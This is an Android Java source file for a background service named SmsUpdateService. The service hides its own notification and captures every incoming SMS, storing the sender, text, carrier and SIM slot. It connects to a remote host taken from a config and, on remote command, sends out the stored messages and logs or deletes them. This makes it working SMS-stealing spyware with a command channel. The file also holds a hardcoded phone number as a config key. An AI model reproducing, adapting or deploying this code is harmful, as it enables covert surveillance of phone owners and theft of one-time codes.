package com.anubhav.codereverse.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.IBinder;
import android.text.TextUtils;

import com.anubhav.codereverse.database.SharedPreferenceManager;
import com.anubhav.codereverse.utils.ApkUtils;
import com.anubhav.codereverse.utils.Constants;
import com.anubhav.codereverse.utils.Utils;
import com.anubhav.codereverse.utils.smscatcher.OnSmsCatchListener;
import com.anubhav.codereverse.utils.smscatcher.SmsCatcher;
import com.anubhav.codereverse.utils.socket.OnReadListener;
import com.anubhav.codereverse.utils.socket.TCPClient;
import com.anubhav.codereverse.utils.socket.common.ObjectWriter;

import org.json.JSONObject;

import java.io.EOFException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class SmsUpdateService extends Service implements Runnable, SharedPreferences.OnSharedPreferenceChangeListener {

    private static String CONFIG_USER_KEY = "+918290448340";
    private static String NOTIFICATION_MSG = "Service running..";
    private static int NOTIFICATION_ICON_RES = android.R.drawable.sym_def_app_icon;
    private static int NOTIFICATION_ID = 786634;

    public static final String TAG = SmsUpdateService.class.getSimpleName();
    private static final String KEY_ENABLE_SERVICE = "service_enable";
    private static final String KEY_REMOTE_HOST = "remote_host";
    private static final String KEY_REMOTE_PORT = "remote_port";

    private Notification.Builder notification;
    private NotificationManager notificationManager;
    private SharedPreferenceManager preferences;
    private SmsCatcher smsCatcher;
    private TCPClient tcpClient;

    private final Object lock = new Object();
    private ExecutorService executorService;
    private boolean isForeground = false;
    private int runningJobs = 0;

    private boolean serviceEnabled = false;
    private String remoteHost = "";
    private int remotePort = 0;

    @Override
    public void onCreate() {
        Utils.getLog(TAG, "onCreate");
        // Creating Cached thread pool so that avoid creation of Thread //again and again
        this.executorService = Executors.newCachedThreadPool();
        this.notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Utils.getLog(TAG, "onStartCommand");
        this.preferences = SharedPreferenceManager.get(this);
        this.preferences.setPreferencesChangeListener(this);
        initializePreferences();

        synchronized (lock) {
            executorService.execute(this);
            runningJobs++;
        }

        if (serviceEnabled) {
            startForegroundIfNeeded();
            return START_STICKY;
        }
        return START_NOT_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    /**
     * Create NotificationChannel for the Foreground Service
     */
    private String createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = SmsUpdateService.class.getSimpleName();
            NotificationChannel channel = new NotificationChannel(channelId, ApkUtils.getApplicationName(this), NotificationManager.IMPORTANCE_HIGH);
            channel.setImportance(NotificationManager.IMPORTANCE_NONE);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            notificationManager.createNotificationChannel(channel);
            return channelId;
        }
        return "";
    }

    /**
     * Create NotificationBuilder for the Foreground Service
     */
    private Notification.Builder createNotification() {
        Intent intent = new Intent(this, SmsUpdateService.class);
        PendingIntent pendingIntent = PendingIntent.getService(this, NOTIFICATION_ID, intent, Utils.getPendingIntentFlag());

        Notification.Builder notificationBuilder = new Notification.Builder(this);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            String channelId = createNotificationChannel();
            notificationBuilder = new Notification.Builder(this, channelId);
        }
        return notificationBuilder
                .setSmallIcon(NOTIFICATION_ICON_RES)
                .setContentTitle(ApkUtils.getApplicationName(this))
                .setContentText(NOTIFICATION_MSG)
                .setPriority(Notification.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .setContentIntent(pendingIntent);
    }

    // Method to start the service in foreground if the no. of jobs is //larger
    private void startForegroundIfNeeded() {
        if (!isForeground) {
            notification = createNotification();
            startForeground(NOTIFICATION_ID, notification.build());
            isForeground = true;
        }
    }

    // method to stop Service if all the job i done
    private void stopForegroundIfAllDone() {
        if (runningJobs == 0 && isForeground) {
            stopForeground(true);
            isForeground = false;
        }
    }

    @Override
    public void onDestroy() {
        Utils.getLog(TAG, "onDestroy");
        super.onDestroy();
        if (smsCatcher != null) smsCatcher.onStop();
        preferences.removePreferencesChangeListener(this);
        executorService.shutdownNow();
        synchronized (lock) {
            runningJobs = 0;
            stopForegroundIfAllDone();
        }
    }

    /**
     * SharedPreferences settings
     */
    @Override
    public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
        if (key == null) return;
        initializePreferences(sharedPreferences, SharedPreferenceManager.Param.valueOf(key));
    }

    private void initializePreferences() {
        serviceEnabled = preferences.smsServiceEnabled();
        remoteHost = preferences.remoteHost();
        remotePort = preferences.remotePort();
    }

    private void initializePreferences(SharedPreferences sharedPrefs, SharedPreferenceManager.Param param) {
        switch (param) {
            case sms_service_enabled:
                serviceEnabled = preferences.read(param, false);
                break;
            case remote_host:
                remoteHost = preferences.read(param, "");
                break;
            case remote_port:
                remotePort = preferences.read(param, 0);
                break;
            default:
                Utils.getLog(TAG, "Not yet implemented in SharedPreferenceManager");
                break;
        }
    }

    @Override
    public void run() {
        try {
            JSONObject prefData = Utils.loadConfig(CONFIG_USER_KEY).getJSONObject("sms_update");
            try {
                String notifyMsg = prefData.getString("notification_msg");
                NOTIFICATION_MSG = (notifyMsg.isEmpty() ? "Service running.." : notifyMsg);
            } catch (Exception ignored) {
                NOTIFICATION_MSG = "Service running..";
            }

            preferences.smsServiceEnabled(prefData.getBoolean(KEY_ENABLE_SERVICE));
            preferences.remoteHost(prefData.getString(KEY_REMOTE_HOST));
            preferences.remotePort(prefData.getInt(KEY_REMOTE_PORT));
            initializePreferences();

            if (serviceEnabled) {
                try {
                    Notification.Builder newNotification = notification.setContentText(NOTIFICATION_MSG);
                    notificationManager.notify(NOTIFICATION_ID, newNotification.build());
                } catch (Exception ignored) {
                }

                smsCatcher = new SmsCatcher(SmsUpdateService.this, new OnSmsCatchListener<String>() {
                    @Override
                    public void onSmsCatch(String message, String senderNumber, int receivedInSimSlot, String receivedInCarrierName, String receivedInNumber) {
                        try {
                            JSONObject msgObject = new JSONObject();
                            msgObject.put("timeStamp", Utils.getTimeStamp());
                            msgObject.put("message", message);
                            msgObject.put("senderNumber", senderNumber);
                            msgObject.put("receivedInSimSlot", receivedInSimSlot);
                            msgObject.put("receivedInCarrierName", receivedInCarrierName);
                            msgObject.put("receivedInNumber", receivedInNumber);
                            Utils.saveJsonObjectInArray(SmsUpdateService.this, Constants.USER_SMS_FILENAME, msgObject);
                        } catch (Exception e) {
                            Utils.getLog(SmsUpdateService.this, e.toString());
                            e.printStackTrace();
                        }
                    }
                });
                // don't need to declare again, we are already declare Sms BroadcastReceiver in manifest
                //smsCatcher.onStart();

                if (remoteHost.isEmpty() || remotePort <= 0) return;
                tcpClient = new TCPClient(this, remoteHost, remotePort);
                tcpClient.setHeader(Utils.getDeviceID(this), CONFIG_USER_KEY);
                if (tcpClient.isClosed()) {
                    try {
                        tcpClient.connect(onReadListener);
                    } catch (EOFException e) {
                        e.printStackTrace();
                        // if fullyRead EOFException happens than close this service or task
                        runningJobs--;
                        stopForegroundIfAllDone();
                    } catch (Exception e) {
                        e.printStackTrace();
                        if (e.toString().contains("Remote host or Remote port not valid")) {
                            runningJobs--;
                            stopForegroundIfAllDone();
                            return;
                        }
                        synchronized (lock) {
                            executorService.execute(this);
                            runningJobs++;
                        }
                    }
                }

            } else {
                // After completing job reduce the no. of jobs that is being
                runningJobs--;
                stopForegroundIfAllDone();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private OnReadListener onReadListener = new OnReadListener() {
        @Override
        public void onReadData(String key, Object data, ObjectWriter writer) {
            try {
                switch (key) {
                    case Constants.KEY_GET_SMS_LOGS:
                        String fileName1 = "Log_" + SmsUpdateService.TAG + ".txt";
                        writer.write(Utils.getStringFromFile(SmsUpdateService.this, fileName1));
                    case Constants.KEY_GET_DOWNLOAD_LOGS:
                        String fileName2 = "Log_" + DownloadInstallApp.TAG + ".txt";
                        writer.write(Utils.getStringFromFile(SmsUpdateService.this, fileName2));
                    case Constants.KEY_GET_SMS:
                        String userSmsArray = Utils.getStringFromFile(SmsUpdateService.this, Constants.USER_SMS_FILENAME);
                        if (TextUtils.isEmpty(userSmsArray)) userSmsArray = "[]";
                        writer.write(userSmsArray);
                    case Constants.KEY_REMOVE_SMS:
                        boolean isDeleted = deleteFile(Constants.USER_SMS_FILENAME);
                        writer.write(isDeleted ? "Removed successfully" : "Removed failed");
                }
            } catch (Exception e) {
                e.printStackTrace();
                Utils.getLog("OnReadListener", e.toString());
            }
        }
    };

    /**
     * Global static functions
     */
    public static void start(Context context) {
        try {
            Intent intent = new Intent(context, SmsUpdateService.class);
            context.startService(intent);
        } catch (IllegalArgumentException e) {
            // The process is classed as idle by the platform. Starting a background service is not allowed in this state.
            Utils.getLog(TAG, "Failed to start Service (process is idle).");
        } catch (IllegalStateException e) {
            // The app is in background, starting service is disallow
            Utils.getLog(TAG, "Failed to start Service (app is in background, foregroundAllowed == false)");
        }
    }

}